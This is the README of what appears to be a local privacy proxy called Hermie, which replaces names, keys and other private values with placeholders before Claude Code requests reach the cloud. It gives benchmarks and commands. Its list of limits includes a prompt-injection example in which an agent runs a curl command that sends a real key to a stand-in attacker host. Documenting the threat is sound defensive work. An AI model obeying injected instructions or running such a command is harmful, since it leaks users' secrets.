<p align="center">
  <img src="assets/logo.png" width="160" alt="Hermie, a hermit crab peeking out of its shell">
</p>

<h1 align="center">Hermie</h1>

<p align="center"><b>The AI sees your question. It never sees your private details.</b></p>

<p align="center">
  <a href="LICENSE"><img alt="MIT" src="https://img.shields.io/badge/license-MIT-orange"></a>
  <img alt="Python 3.12" src="https://img.shields.io/badge/python-3.12-blue">
  <img alt="platform: macOS / Linux" src="https://img.shields.io/badge/platform-macOS%20%2F%20Linux-lightgrey">
</p>

Hermie is a small proxy that runs on your machine, between your coding agent (Claude Code) and the cloud API. Before a request leaves, it swaps names, contact details, ID numbers, keys, company names, amounts and dates for placeholders. When the reply comes back, it puts the real values back. You work as usual; the cloud only ever sees `<PERSON_1>`.

```text
You type:          Ask Maria Gonzalez (555-010-0199) why her key sk-test-...0000 stopped working.
The cloud gets:    Ask <PERSON_2> (<PHONE_NUMBER_1>) why her key <SECRET_1> stopped working.
You read:          ...Maria Gonzalez... (real values restored, also inside the files the agent writes)
```

## Why use it

- **Hand over a whole work folder.** Contracts, employee tables, meeting notes, contacts and `.env` files can be read by the agent; the private parts stay on your machine.
- **Your work keeps working.** The model is told what placeholders are and uses them like real values. Hermie restores them in the reply and in tool calls, so `grep <PHONE_NUMBER_1> customers.csv` runs with the real number and a `.env` the agent writes gets the real key.
- **Strict by default.** If a detector fails, nothing is sent. With the optional local judge, a message it finds sensitive is held until you decide.
- **Proof, not a promise.** Every request leaves a receipt that lists what kinds were replaced, never the values. `hermie show ID` prints exactly what the cloud received.
- **Local.** Detection and rewriting run on your machine; no third service decides what is private. Your login is forwarded untouched.

## When it is not sure, it asks

![Claude Code through Hermie: the user asks for talking points and mentions that Northwind Holdings will cut 80 jobs, which staff do not know yet. Hermie's menu appears inside Claude Code: the message was stopped before it left the machine because a local model judged it private, the company name is already a placeholder, and the user can choose not to send, send this one, or send everything this session. The user presses 2 and Claude answers; the reply names Northwind Holdings again](assets/demo-hold.gif)

Some private things have no fixed shape: "we will cut 80 jobs in March, staff do not know yet". With the optional local judge turned on, Hermie reads each message before it leaves and, when it looks like non-public business or personal information, stops it and asks you inside Claude Code. In the recording the company name is already a placeholder; the judge holds the rest, you press **2** (Send this one), and Claude carries on. Choose **1** and nothing leaves. You are asked once per message, not again when Claude Code repeats it in a later request.

Turn it on with one line in `~/.hermie/config.toml`: `judge = "ollama:MODEL"` (any local Ollama model) or `judge = "laya:PATH"` (a small fine-tuned decision model, about 40 ms; see [the guide](docs/guide.md#the-optional-judge-a-small-decision-model)). Script: [`demo/record-hold.sh`](demo/record-hold.sh).

## How well it works

**Real work, end to end** (2026-10-19). 21 tasks on a seeded work folder (an English sales contract, a Chinese lease, an employee table, Chinese meeting notes, a board memo, contacts, a forwarded mail, a small app with keys), 10 of them in Chinese. Each task ran in real Claude Code twice: through Hermie and directly. An independent recorder saved every request that left the machine.

| | Result |
|---|---|
| Answers correct | 21 / 21 through Hermie, 21 / 21 directly: hiding the values did not cost an answer |
| Planted private values that leaked | 3 of 148 (2 salaries, 1 Chinese project name); the project name is fixed |
| Kinds with no leak | names, emails, phones, addresses, ID numbers, cards, IBANs, API keys, passwords, credentials in URLs, companies, dates |

One case is still open: when the agent writes a script that sorts a table it never read and prints the top salaries without a header, Hermie cannot tell those numbers from ids or counts. These numbers come from one data set; the company names it generates use common suffixes (Inc., Holdings), so company recall here is an upper bound.

**Secrets in source code** ([Samsung CredData](https://github.com/Samsung/CredData), held-out test split, labelled secrets found):

| Scanner | Found (recall) | Flags that are real (precision) |
|---|---|---|
| Hermie | 61% (81% of the kinds it claims) | 61% |
| detect-secrets | 40% | 53% |
| gitleaks | 23% | 87% |
| trufflehog | 3% | 65% |
| CredSweeper (trained on CredData) | 98% | 98% |

Hermie is tuned to miss less and accept more false alarms: a false alarm costs a placeholder, a miss sends a key. Strong on PEM keys, JWTs, Bearer / Basic headers, URL credentials, AWS and token formats; weaker on passwords in shell commands and SQL.

## What it hides, and what it does not

| Hidden by default (English and Chinese) | How it is found |
|---|---|
| API keys, tokens, passwords, private keys | about 40 provider formats, `NAME=value` assignments, headers, URLs |
| Person names | labels (`Party A:`, `Tenant:`, `Name:`), table columns, name lists, vCards, an NLP model |
| Phones, emails, addresses, ID numbers, cards, IBANs | shapes and checksums |
| Company names, amounts, dates, project names | legal suffixes, currency marks, calendar forms, table columns, `Project X` |

Once a value is hidden, it is replaced wherever it appears again, in every later request. A value Hermie cannot recognize you can add yourself: `hermie hide VALUE`.

Not hidden:

- **Confidential prose with no names or numbers**, such as "we plan to close the plant, don't tell staff". Rules cannot see this. An optional local judge model can ([guide](docs/guide.md#the-optional-judge-a-small-decision-model)); it is off by default.
- **Your code itself.** Hermie protects data in the code and the conversation, not the code.
- **Traffic that does not go through Hermie**: telemetry, login flows, clients that ignore the base URL.
- A prompt-injected model can make the agent use a real value locally (the agent runs `curl evil.example?q=<SECRET_1>` with the real key). Watch Claude Code's permission prompt.
- `~/.hermie/mapping.json` holds the real values in plain text (mode 0600). `hermie forget` empties it.

The full list is in [the guide](docs/guide.md#what-this-does-not-protect-in-full) and [SECURITY.md](SECURITY.md).

## Quickstart

```bash
pip install git+https://github.com/Code-byte404/hermie@v0.4.0 && python -m spacy download en_core_web_lg
hermie claude                    # opens Claude Code through Hermie
```

`hermie claude` starts the proxy if none is running, opens Claude Code through it for that session (your settings files are not changed), and stops the proxy when the last window closes. Arguments after `claude` go to Claude Code. Chinese names in running text need `python -m spacy download zh_core_web_sm` and `languages = ["en", "zh"]` in `~/.hermie/config.toml`; the other Chinese rules work without it.

Inside Claude Code you see what happened, each turn (a key pasted into the chat, written to `.env` by Claude, [recording](docs/guide.md#keys-the-model-never-sees)):

```text
⏺ Write(.env)
  ⎿  PostToolUse:Write says: Hermie put back 1 real value before this Write (.env) ran.
  ⎿  Stop says: Hermie · this turn (3 requests)
       replaced    Alice Chen -> <PERSON_1>, alice@example.com -> <EMAIL_ADDRESS_1>, sk-tes…f3a -> <SECRET_1>
       Only placeholders left this machine.
```

These lines are shown only to you, not to the model.

## Everyday commands

| Command | What it does |
|---|---|
| `hermie claude` | Claude Code through Hermie |
| `hermie tail` | follow the receipt: one line per request, what kinds were replaced |
| `hermie show ID` | the exact request body the cloud received |
| `hermie hide VALUE` | always hide this value (no argument: type it without echo) |
| `hermie allow ID` | release something Hermie held back |
| `hermie stats` / `hermie status` | totals / one status line |
| `hermie forget` | delete the stored real values |
| `hermie serve` | run the proxy on its own (`127.0.0.1:8787`) for other clients |

`hermie serve --mode observe` replaces nothing and only writes the receipt: a way to see what Hermie would do before you rely on it.

## Clients

| Client | Status |
|---|---|
| Claude Code | Verified (2.1.291 with a subscription login; hooks and status line with 2.1.295) |
| Codex CLI, Gemini CLI | Not verified. Their OAuth logins bypass a custom base URL; only API-key use can work |
| aider | Not tested; expected to work with `ANTHROPIC_BASE_URL` or `OPENAI_BASE_URL` |

`hermie serve` prints the base URLs: `/anthropic`, `/openai/v1`, `/gemini`, `/custom`. Setup for each client is in [the guide](docs/guide.md).

## More

- [docs/guide.md](docs/guide.md): every detector, the optional judge, held messages, modes, configuration, roadmap.
- [docs/architecture.md](docs/architecture.md): how a request and a reply pass through Hermie.
- [CONTRIBUTING.md](CONTRIBUTING.md) · [SECURITY.md](SECURITY.md) · MIT [LICENSE](LICENSE)

Hermie used to be a local-first coding agent; that project is archived at [hermie-agent](https://github.com/Code-byte404/hermie-agent).
